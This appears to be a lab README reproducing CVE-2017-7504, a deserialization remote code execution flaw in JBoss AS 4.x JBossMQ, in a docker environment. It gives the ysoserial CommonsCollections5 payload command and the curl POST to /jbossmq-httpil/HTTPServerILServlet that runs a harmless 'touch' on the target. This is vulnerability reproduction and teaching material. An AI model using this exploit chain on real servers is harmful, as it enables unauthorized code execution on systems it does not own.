# JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504)

[中文版本(Chinese version)](README.zh-cn.md)

Red Hat JBoss Application Server is a JavaEE-based open source application server. In JBoss AS 4.x and earlier versions, there is a deserialization vulnerability in the HTTPServerILServlet.java file of the JMS over HTTP Invocation Layer in JBossMQ implementation. Remote attackers can exploit this vulnerability to execute arbitrary code by using specially crafted serialized data.

References:

- https://github.com/joaomatosf/JavaDeserH2HC
- https://www.youtube.com/watch?v=jVMr4eeJ2Po

## Environment Setup

Execute the following command to start JBoss AS 4.0.5:

```
docker compose up -d
```

After the environment is started, the target will be available at `http://your-ip:8080`.

## Vulnerability Reproduce

This vulnerability exists in the `/jbossmq-httpil/HTTPServerILServlet` request. We can use the CommonsCollections5 exploitation chain from ysoserial to reproduce it. Generate the payload:

```
java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 "touch /tmp/success" > 1.ser
```

Send the content of 1.ser file as POST Body:

```
curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser
```

![](1.png)

Execute `docker compose exec jboss bash` to enter the container, and you can see that `/tmp/success` has been successfully created.
